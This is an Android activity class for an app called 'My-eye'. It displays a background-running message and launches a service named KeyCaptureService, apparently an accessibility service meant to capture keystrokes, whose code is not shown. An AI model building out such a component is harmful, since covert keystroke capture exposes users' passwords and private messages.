package com.example.myeye;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Simple UI text so you know the app is open
        TextView textView = new TextView(this);
        textView.setText("My-eye Service is Running in Background.");
        setContentView(textView);

        // Explicitly start the accessibility service
        Intent serviceIntent = new Intent(this, KeyCaptureService.class);
        startService(serviceIntent);
    }
}
